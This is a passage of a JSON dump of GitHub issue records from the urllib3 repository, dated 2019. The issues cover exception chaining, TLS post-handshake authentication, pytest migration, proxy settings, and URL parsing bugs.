"https://api.github.com/users/cjerdonek/gists{/gist_id}", "starred_url": "https://api.github.com/users/cjerdonek/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/cjerdonek/subscriptions", "organizations_url": "https://api.github.com/users/cjerdonek/orgs", "repos_url": "https://api.github.com/users/cjerdonek/repos", "events_url": "https://api.github.com/users/cjerdonek/events{/privacy}", "received_events_url": "https://api.github.com/users/cjerdonek/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-06-18T06:33:00Z", "updated_at": "2019-07-05T23:27:01Z", "closed_at": "2019-07-05T23:27:01Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "This issue is a repeat of #861, but for exceptions that derive from `BaseException` and not `Exception`.\r\n\r\nSpecifically, if an `Exception` gets raised from `conn.getresponse()` in this line of code: https://github.com/urllib3/urllib3/blob/728d9244665ef5b03103cb74d7b409ebe4f23b43/src/urllib3/connectionpool.py#L411\r\n\r\nthen `urllib3` calls `raise from None` to remove the spurious `TypeError` from the exception chain: https://github.com/urllib3/urllib3/blob/728d9244665ef5b03103cb74d7b409ebe4f23b43/src/urllib3/connectionpool.py#L405-L415\r\n\r\nHowever, if a `BaseException` like `KeyboardInterrupt` or `SystemExit` is raised during the call to `conn.getresponse()`, then the `TypeError` _isn't_ removed. This is because the try-except only catches and re-raises `Exception` and not `BaseException`. As mentioned in the original #861, seeing the spurious `TypeError` makes it look like there is bug e.g. in the error handling that occurs while the program exits. The `BaseException` can occur e.g. if a request is taking a long time and the application is terminated from another process.\r\n\r\nThe fix is to change `Exception` to `BaseException` in this line of code: https://github.com/urllib3/urllib3/blob/728d9244665ef5b03103cb74d7b409ebe4f23b43/src/urllib3/connectionpool.py#L412\r\n\r\nI would file a PR, but I'm not sure I'd have time to craft a test. I note, though, that the original PR #861 didn't have a test.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1634", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1634/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1634/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1634/events", "html_url": "https://github.com/urllib3/urllib3/issues/1634", "id": 453007376, "node_id": "MDU6SXNzdWU0NTMwMDczNzY=", "number": 1634, "title": "Enable TLS 1.3 post-handshake authentication", "user": {"login": "tiran", "id": 444071, "node_id": "MDQ6VXNlcjQ0NDA3MQ==", "avatar_url": "https://avatars3.githubusercontent.com/u/444071?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tiran", "html_url": "https://github.com/tiran", "followers_url": "https://api.github.com/users/tiran/followers", "following_url": "https://api.github.com/users/tiran/following{/other_user}", "gists_url": "https://api.github.com/users/tiran/gists{/gist_id}", "starred_url": "https://api.github.com/users/tiran/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tiran/subscriptions", "organizations_url": "https://api.github.com/users/tiran/orgs", "repos_url": "https://api.github.com/users/tiran/repos", "events_url": "https://api.github.com/users/tiran/events{/privacy}", "received_events_url": "https://api.github.com/users/tiran/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-06-06T12:39:15Z", "updated_at": "2019-08-16T13:55:19Z", "closed_at": "2019-08-16T13:55:19Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "urllib3 should enable post-handshake authentication by default:\r\n\r\n* https://docs.python.org/3/library/ssl.html#ssl.SSLContext.post_handshake_auth\r\n* https://tools.ietf.org/html/rfc8446#section-4.6.2\r\n\r\nPHA is well defined for HTTPS and necessary to support path-specific TLS client cert authentication with TLS 1.3. Without PHA, a server cannot request client cert authentication based on HTTP request parameters like method or path.\r\n\r\nPHA is disabled by default, because some protocols cannot deal with PHA yet. In my understanding it is always safe to enable PHA for a HTTP/1.1 client. There are some theoretical issue with HTTP/2.0, but that does not affect urllib3.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1632", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1632/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1632/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1632/events", "html_url": "https://github.com/urllib3/urllib3/issues/1632", "id": 451749382, "node_id": "MDU6SXNzdWU0NTE3NDkzODI=", "number": 1632, "title": "Support getting credentials lazily for HTTP basic auth", "user": {"login": "manueljacob", "id": 8070849, "node_id": "MDQ6VXNlcjgwNzA4NDk=", "avatar_url": "https://avatars3.githubusercontent.com/u/8070849?v=4", "gravatar_id": "", "url": "https://api.github.com/users/manueljacob", "html_url": "https://github.com/manueljacob", "followers_url": "https://api.github.com/users/manueljacob/followers", "following_url": "https://api.github.com/users/manueljacob/following{/other_user}", "gists_url": "https://api.github.com/users/manueljacob/gists{/gist_id}", "starred_url": "https://api.github.com/users/manueljacob/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/manueljacob/subscriptions", "organizations_url": "https://api.github.com/users/manueljacob/orgs", "repos_url": "https://api.github.com/users/manueljacob/repos", "events_url": "https://api.github.com/users/manueljacob/events{/privacy}", "received_events_url": "https://api.github.com/users/manueljacob/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-04T00:55:32Z", "updated_at": "2019-07-17T15:18:09Z", "closed_at": "2019-07-17T15:18:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "Use case: open a URL, asking the user for username and password if (and only if) the server requests basic auth.\r\n\r\nThis could be implemented in `HTTPConnectionPool.urlopen()`, similar to how redirects are implemented.\r\n\r\nRelated tickets are #984 and #1172, although both seem to have a more general use case in mind and propose to extend the `Retry` classes, which seems to be controversial.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1628", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1628/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1628/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1628/events", "html_url": "https://github.com/urllib3/urllib3/issues/1628", "id": 450894548, "node_id": "MDU6SXNzdWU0NTA4OTQ1NDg=", "number": 1628, "title": "pyopenssl error when building docs", "user": {"login": "bgrant", "id": 624123, "node_id": "MDQ6VXNlcjYyNDEyMw==", "avatar_url": "https://avatars3.githubusercontent.com/u/624123?v=4", "gravatar_id": "", "url": "https://api.github.com/users/bgrant", "html_url": "https://github.com/bgrant", "followers_url": "https://api.github.com/users/bgrant/followers", "following_url": "https://api.github.com/users/bgrant/following{/other_user}", "gists_url": "https://api.github.com/users/bgrant/gists{/gist_id}", "starred_url": "https://api.github.com/users/bgrant/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bgrant/subscriptions", "organizations_url": "https://api.github.com/users/bgrant/orgs", "repos_url": "https://api.github.com/users/bgrant/repos", "events_url": "https://api.github.com/users/bgrant/events{/privacy}", "received_events_url": "https://api.github.com/users/bgrant/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-31T17:03:26Z", "updated_at": "2019-05-31T17:40:36Z", "closed_at": "2019-05-31T17:40:36Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "When running `make html` in the `docs` directory:\r\n```\r\nWarning, treated as error:\r\nautodoc: failed to import module 'pyopenssl' from module 'urllib3.contrib'; the following exception was raised:\r\nNo module named 'OpenSSL'\r\nmake: *** [html] Error 2\r\n```\r\n\r\nI did run `pip install -r requirements.txt` beforehand.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1627", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1627/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1627/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1627/events", "html_url": "https://github.com/urllib3/urllib3/issues/1627", "id": 450538263, "node_id": "MDU6SXNzdWU0NTA1MzgyNjM=", "number": 1627, "title": "decryption failed or bad record mac", "user": {"login": "hamid-r-shakibi", "id": 34796399, "node_id": "MDQ6VXNlcjM0Nzk2Mzk5", "avatar_url": "https://avatars3.githubusercontent.com/u/34796399?v=4", "gravatar_id": "", "url": "https://api.github.com/users/hamid-r-shakibi", "html_url": "https://github.com/hamid-r-shakibi", "followers_url": "https://api.github.com/users/hamid-r-shakibi/followers", "following_url": "https://api.github.com/users/hamid-r-shakibi/following{/other_user}", "gists_url": "https://api.github.com/users/hamid-r-shakibi/gists{/gist_id}", "starred_url": "https://api.github.com/users/hamid-r-shakibi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/hamid-r-shakibi/subscriptions", "organizations_url": "https://api.github.com/users/hamid-r-shakibi/orgs", "repos_url": "https://api.github.com/users/hamid-r-shakibi/repos", "events_url": "https://api.github.com/users/hamid-r-shakibi/events{/privacy}", "received_events_url": "https://api.github.com/users/hamid-r-shakibi/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-05-30T22:43:43Z", "updated_at": "2019-06-03T17:27:43Z", "closed_at": "2019-06-03T17:27:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nI'm using urllib3 version 1.25.3 and every time I sometimes when I try to connect to sites it gives me decryption failed or bad record mac error.\r\n`urllib3 HTTPError [SSL: DECRYPTION_FAILED_OR_BAD_RECORD_MAC] decryption failed or bad record mac (_ssl.c:2305)`\r\nI tried to search in google but I didn't find anything useful.i even don't. I even tried deleting and add new SSL cert even with other cert but it doesn't work. why this error is happening and any suggestions to fix it?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1625", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1625/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1625/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1625/events", "html_url": "https://github.com/urllib3/urllib3/issues/1625", "id": 450402162, "node_id": "MDU6SXNzdWU0NTA0MDIxNjI=", "number": 1625, "title": "Add time unit (seconds) to Timeout docs", "user": {"login": "bgrant", "id": 624123, "node_id": "MDQ6VXNlcjYyNDEyMw==", "avatar_url": "https://avatars3.githubusercontent.com/u/624123?v=4", "gravatar_id": "", "url": "https://api.github.com/users/bgrant", "html_url": "https://github.com/bgrant", "followers_url": "https://api.github.com/users/bgrant/followers", "following_url": "https://api.github.com/users/bgrant/following{/other_user}", "gists_url": "https://api.github.com/users/bgrant/gists{/gist_id}", "starred_url": "https://api.github.com/users/bgrant/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bgrant/subscriptions", "organizations_url": "https://api.github.com/users/bgrant/orgs", "repos_url": "https://api.github.com/users/bgrant/repos", "events_url": "https://api.github.com/users/bgrant/events{/privacy}", "received_events_url": "https://api.github.com/users/bgrant/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}, {"id": 404015969, "node_id": "MDU6TGFiZWw0MDQwMTU5Njk=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Documentation", "name": "Documentation", "color": "006b75", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-05-30T16:46:45Z", "updated_at": "2019-06-04T18:31:01Z", "closed_at": "2019-06-04T18:31:01Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Neither the [docs](https://urllib3.readthedocs.io/en/latest/user-guide.html#using-timeouts) nor the [docstrings](https://github.com/urllib3/urllib3/blob/master/src/urllib3/util/timeout.py#L20) say what unit timeouts should be provided in.  Looking at the code, it appears to be \"seconds\", but it would be nice if the docs said this explicitly.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1623", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1623/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1623/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1623/events", "html_url": "https://github.com/urllib3/urllib3/issues/1623", "id": 449444916, "node_id": "MDU6SXNzdWU0NDk0NDQ5MTY=", "number": 1623, "title": "Stop using unittest's addCleanup", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-05-28T19:46:01Z", "updated_at": "2019-06-19T13:19:34Z", "closed_at": "2019-06-19T13:13:00Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "We want to stop using the [unittest](https://docs.python.org/3/library/unittest.html) compatibility mode of pytest because:\r\n\r\n * the current code does not work with pytest>=4.2 (possibly a bug in pytest)\r\n * it's better to use only one test framework, and pytest is nice :)\r\n\r\nThe pure pytest migration has started in https://github.com/urllib3/urllib3/pull/1614 where @RatanShreshtha has worked on transforming all `self.assert*` calls into Python asserts. This was an important first part because that was the majority of unittest code.\r\n\r\nMost of the remaining changes will now be quite limited in scope, but there's one thing left that I would like to talk about here: the [`self.addCleanup`](https://docs.python.org/3/library/unittest.html#unittest.TestCase.addCleanup) calls. We have about 150 of them, and they ensure that the opened connections are closed. `self.addCleanup` is called on the following five classes:\r\n\r\n * HTTPConnectionPool and subclass HTTPSConnectionPool\r\n * PoolManager and subclass ProxyManager\r\n * socks.SOCKSProxyManager\r\n\r\n(Since this could be tackled by a contributor who isn't familiar with context managers, I preferred to err on the side of verbosity here.)\r\n\r\nLet's look at an example:\r\n\r\n```python3\r\ndef test_redirect(self):\r\n    http = PoolManager()\r\n    self.addCleanup(http.clear)\r\n    r = http.request(\"GET\", \"/redirect\", ...)\r\n    assert r.status == 303\r\n```\r\n\r\nThis is equivalent to:\r\n\r\n```python3\r\ndef test_redirect(self):\r\n    http = PoolManager()\r\n    try:\r\n        r = http.request(\"GET\", \"/redirect\", ...)\r\n        assert r.status == 303\r\n    finally:\r\n        http.clear()\r\n```\r\n\r\nIf PoolManager had a `close()` method that behavec like `clear()`, this would also work:\r\n\r\n```python3\r\nimport contextlib\r\n\r\ndef test_redirect(self):\r\n    with contextlib.closing(PoolManager()) as http:\r\n        r = http.request(\"GET\", \"/redirect\", ...)\r\n        assert r.status == 303\r\n```\r\n\r\nAlternatively, if PoolManager implemented the context manager protocol (ie. had an `__exit__` method), we could write:\r\n\r\n```python3\r\ndef test_redirect(self):\r\n    with PoolManager() as http:\r\n        r = http.request(\"GET\", \"/redirect\", ...)\r\n        assert r.status == 303\r\n```\r\n\r\nThis last variant is slightly better than the addCleanup variant, I think. But can we do better? I think pytest fixtures can help here. For example, using a pool_manager fixture:\r\n\r\n```python3\r\nimport pytest\r\n\r\n@pytest.fixture\r\ndef pool_manager():\r\n    manager = PoolManager()\r\n    try:\r\n        yield manager\r\n    finally:\r\n        manager.clear()\r\n\r\n\r\ndef test_redirect(pool_manager):\r\n    r = http.request(\"GET\", \"/redirect\", ...)\r\n    assert r.status == 303\r\n```\r\n\r\nThis reduces verbosity in the tests themselves (look, only two lines left!). (I think that will also help with our async work because it will allow us to pass an AsyncPoolManager too, but that's mostly hypothetical for now.)\r\n\r\nAnyway, my proposal is to use the fixtures when there the classes are created without any parameters, and to use the `with PoolManager(args, kwargs) as http:` form otherwise.\r\n\r\nWhat do you think of that plan, @sethmlarson?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1622", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1622/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1622/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1622/events", "html_url": "https://github.com/urllib3/urllib3/issues/1622", "id": 449077706, "node_id": "MDU6SXNzdWU0NDkwNzc3MDY=", "number": 1622, "title": "Password-protected keyfiles questions", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-05-28T06:00:09Z", "updated_at": "2019-05-28T19:37:33Z", "closed_at": "2019-05-28T19:37:33Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Thanks to @sethmlarson, #1489 added support for password-protected client keyfiles. But to merge it into the urllib3 async branch, I need to understand how it works. :) So I have two questions.\r\n\r\nFirst, do we need to add a password argument to our  own `SSLContext.load_cert_chain`? See https://github.com/urllib3/urllib3/blob/master/src/urllib3/util/ssl_.py#L125-L127 (Also, it looks like if we require Python 2.7.9+ which is nearly 5 years old then we can stop providing our own SSLContext.)\r\n\r\nSecond, why do you need a if here? Since the default password value of None, it looks like we can inconditionally pass password in https://github.com/urllib3/urllib3/blob/master/src/urllib3/util/ssl_.py#L353-L356\r\n\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1618", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1618/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1618/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1618/events", "html_url": "https://github.com/urllib3/urllib3/issues/1618", "id": 448124232, "node_id": "MDU6SXNzdWU0NDgxMjQyMzI=", "number": 1618, "title": "why not use system http proxy", "user": {"login": "yyq2013", "id": 4711455, "node_id": "MDQ6VXNlcjQ3MTE0NTU=", "avatar_url": "https://avatars1.githubusercontent.com/u/4711455?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yyq2013", "html_url": "https://github.com/yyq2013", "followers_url": "https://api.github.com/users/yyq2013/followers", "following_url": "https://api.github.com/users/yyq2013/following{/other_user}", "gists_url": "https://api.github.com/users/yyq2013/gists{/gist_id}", "starred_url": "https://api.github.com/users/yyq2013/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yyq2013/subscriptions", "organizations_url": "https://api.github.com/users/yyq2013/orgs", "repos_url": "https://api.github.com/users/yyq2013/repos", "events_url": "https://api.github.com/users/yyq2013/events{/privacy}", "received_events_url": "https://api.github.com/users/yyq2013/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2019-05-24T11:37:29Z", "updated_at": "2019-05-24T16:12:45Z", "closed_at": "2019-05-24T16:02:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "My computer is set http proxy in IE by administrator, and all inbound or outbound should via the proxy.\r\n\r\nI tested a simple url access, java, golang, nodejs all works find without specify the http proxy explicitly but python3 urllib3.\r\n```\r\nimport urllib3\r\n\r\nhttp = urllib3.PoolManager(num_pools=5)\r\nr = http.request('GET', 'https://www.howsmyssl.com/a/check')\r\nprint(r.data)\r\n```\r\n\r\nAnd why it not detect global http proxy setting and should specify in every reuqest or use a ProxyManager, some libraries, such as kubernets python client, package the ProxyManager in its library and we can't change it in time, how to set it?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1617", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1617/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1617/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1617/events", "html_url": "https://github.com/urllib3/urllib3/issues/1617", "id": 447993327, "node_id": "MDU6SXNzdWU0NDc5OTMzMjc=", "number": 1617, "title": "Use black for auto formatting.", "user": {"login": "RatanShreshtha", "id": 10801618, "node_id": "MDQ6VXNlcjEwODAxNjE4", "avatar_url": "https://avatars3.githubusercontent.com/u/10801618?v=4", "gravatar_id": "", "url": "https://api.github.com/users/RatanShreshtha", "html_url": "https://github.com/RatanShreshtha", "followers_url": "https://api.github.com/users/RatanShreshtha/followers", "following_url": "https://api.github.com/users/RatanShreshtha/following{/other_user}", "gists_url": "https://api.github.com/users/RatanShreshtha/gists{/gist_id}", "starred_url": "https://api.github.com/users/RatanShreshtha/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/RatanShreshtha/subscriptions", "organizations_url": "https://api.github.com/users/RatanShreshtha/orgs", "repos_url": "https://api.github.com/users/RatanShreshtha/repos", "events_url": "https://api.github.com/users/RatanShreshtha/events{/privacy}", "received_events_url": "https://api.github.com/users/RatanShreshtha/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 8, "created_at": "2019-05-24T06:02:14Z", "updated_at": "2019-05-24T22:40:40Z", "closed_at": "2019-05-24T22:40:39Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Black describes it as a \r\n> Black is the uncompromising Python code formatter.\r\n\r\nBy using black the code will get uniform formatting and will save us from manually formatting which will save time and mental energy for more important matters.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1612", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1612/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1612/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1612/events", "html_url": "https://github.com/urllib3/urllib3/issues/1612", "id": 445694172, "node_id": "MDU6SXNzdWU0NDU2OTQxNzI=", "number": 1612, "title": "urllib3.exceptions.LocationValueError: No host specified.", "user": {"login": "jlegido", "id": 2960753, "node_id": "MDQ6VXNlcjI5NjA3NTM=", "avatar_url": "https://avatars3.githubusercontent.com/u/2960753?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jlegido", "html_url": "https://github.com/jlegido", "followers_url": "https://api.github.com/users/jlegido/followers", "following_url": "https://api.github.com/users/jlegido/following{/other_user}", "gists_url": "https://api.github.com/users/jlegido/gists{/gist_id}", "starred_url": "https://api.github.com/users/jlegido/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jlegido/subscriptions", "organizations_url": "https://api.github.com/users/jlegido/orgs", "repos_url": "https://api.github.com/users/jlegido/repos", "events_url": "https://api.github.com/users/jlegido/events{/privacy}", "received_events_url": "https://api.github.com/users/jlegido/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 10, "created_at": "2019-05-18T08:38:49Z", "updated_at": "2019-10-18T23:17:53Z", "closed_at": "2019-10-18T23:17:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi there.\r\n\r\nFirst of all many thanks to all people involved in this project.\r\n\r\nI'm facing an issue with version 1.25.2 of this library, which is not happening with version 1.24.1.\r\n\r\nSteps to reproduce:\r\n\r\n1. Create \"requirements.txt\" with below content:\r\n\r\n```\r\nselenium\r\nurllib3==1.24.1\r\n#urllib3==1.25.2\r\n```\r\n\r\n2. Create \"Dockerfile\" with below content:\r\n\r\n```\r\nFROM python:3-stretch\r\n\r\nADD requirements.txt .\r\n\r\nRUN pip install -r requirements.txt\r\n\r\nCOPY test.py /test.py\r\n```\r\n\r\n3. Create \"test.py\" with below content:\r\n\r\n```\r\n#!/usr/bin/python\r\n\r\nfrom selenium import webdriver\r\n\r\nhost = 'selenium'\r\nport = '4444'\r\nurl = host + ':' + port + '/wd/hub'\r\n\r\ndesired_capabilities = {\r\n    'browserName': 'firefox',\r\n    'javascriptEnabled': True,\r\n}\r\n\r\ndriver = webdriver.Remote(command_executor = url, desired_capabilities =\r\n                                                          desired_capabilities)\r\nprint('Success')\r\ndriver.quit()\r\n```\r\n\r\n4. Create \"docker-compose.yaml\" with below content:\r\n\r\n```version: '3.7'\r\n\r\nservices:\r\n\r\n urllib3:\r\n  container_name: urllib3\r\n  build:\r\n   context: .\r\n  stdin_open: true\r\n  tty: true\r\n\r\n selenium:\r\n  container_name: selenium\r\n  image: selenium/standalone-firefox\r\n  # Mandatory, to avoid \"Message: Failed to decode response from marionette\" error\r\n  shm_size: 128m\r\n```\r\n\r\n5. Bring up the environment\r\n\r\n```\r\ndocker-compose up -d --build\r\n```\r\n\r\n6. Test it:\r\n\r\n```\r\ndocker exec -ti urllib3 python /test.py\r\n```\r\n\r\nExpected output:\r\n\r\n```\r\nSuccess\r\n```\r\n\r\n7. Now edit \"requirements.txt\"\r\n\r\n```\r\nvim requirements.txt\r\n```\r\nAnd specify version 1.25.2 of urllib3:\r\n\r\n```\r\nselenium\r\n#urllib3==1.24.1\r\nurllib3==1.25.2\r\n```\r\n\r\n8. Bring down the environment\r\n\r\n```\r\ndocker-compose down\r\n```\r\n\r\n9. Bring up the environment\r\n\r\n```\r\ndocker-compose up -d --build\r\n```\r\n\r\n10. Test it:\r\n\r\n```\r\ndocker exec -ti urllib3 python /test.py\r\n```\r\n\r\nExpected output:\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 15, in <module>\r\n    desired_capabilities)\r\n  File \"/usr/local/lib/python3.7/site-packages/selenium/webdriver/remote/webdriver.py\", line 157, in __init__\r\n    self.start_session(capabilities, browser_profile)\r\n  File \"/usr/local/lib/python3.7/site-packages/selenium/webdriver/remote/webdriver.py\", line 252, in start_session\r\n    response = self.execute(Command.NEW_SESSION, parameters)\r\n  File \"/usr/local/lib/python3.7/site-packages/selenium/webdriver/remote/webdriver.py\", line 319, in execute\r\n    response = self.command_executor.execute(driver_command, params)\r\n  File \"/usr/local/lib/python3.7/site-packages/selenium/webdriver/remote/remote_connection.py\", line 374, in execute\r\n    return self._request(command_info[0], url, body=data)\r\n  File \"/usr/local/lib/python3.7/site-packages/selenium/webdriver/remote/remote_connection.py\", line 402, in _request\r\n    resp = http.request(method, url, body=body, headers=headers)\r\n  File \"/usr/local/lib/python3.7/site-packages/urllib3/request.py\", line 72, in request\r\n    **urlopen_kw)\r\n  File \"/usr/local/lib/python3.7/site-packages/urllib3/request.py\", line 150, in request_encode_body\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/usr/local/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 315, in urlopen\r\n    conn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)\r\n  File \"/usr/local/lib/python3.7/site-packages/urllib3/poolmanager.py\", line 222, in connection_from_host\r\n    raise LocationValueError(\"No host specified.\")\r\nurllib3.exceptions.LocationValueError: No host specified.\r\n```\r\n\r\n11. (Optional) Cleanup\r\n\r\n```\r\ndocker-compose down\r\ndocker rmi localhost/urllib3:latest\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1610", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1610/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1610/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1610/events", "html_url": "https://github.com/urllib3/urllib3/issues/1610", "id": 445295956, "node_id": "MDU6SXNzdWU0NDUyOTU5NTY=", "number": 1610, "title": "parse_url() for urllib3 1.25.x doesn't allow port numbers higher than 2**16-1", "user": {"login": "Bllacky", "id": 6762165, "node_id": "MDQ6VXNlcjY3NjIxNjU=", "avatar_url": "https://avatars3.githubusercontent.com/u/6762165?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Bllacky", "html_url": "https://github.com/Bllacky", "followers_url": 